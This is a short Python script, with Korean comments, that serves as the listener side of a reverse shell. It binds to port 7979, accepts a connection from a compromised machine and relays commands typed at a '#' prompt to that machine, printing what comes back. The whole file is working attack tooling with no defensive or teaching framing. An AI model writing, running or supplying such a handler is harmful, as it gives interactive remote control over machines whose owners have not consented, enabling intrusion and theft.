import socket

def run_reverse_shell(listener_port=7979):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("0.0.0.0", listener_port))
        s.listen(1)
        print(f"[*] Listening for reverse shell on port {listener_port}...\n")

        conn, addr = s.accept()
        print(f"[*] Reverse shell connected from {addr}\n")

        # recv() 대기 시간을 1초로 설정
        conn.settimeout(1)

        with conn:
            while True:
                command = input("# ")           # 명령 입력
                if command.strip() == "exit":   # 종료
                    break
                conn.sendall(command.encode() + b"\n")
                while True:
                    try:
                        data = conn.recv(4096 * 10)
                        if data:
                            print(data.decode(), end="")
                        else:
                            print('\n')
                            break
                    except socket.timeout:
                        # 1초 동안 응답이 없으면 그냥 넘어가고 다음 명령 대기
                        print('\n')
                        break
                    
run_reverse_shell()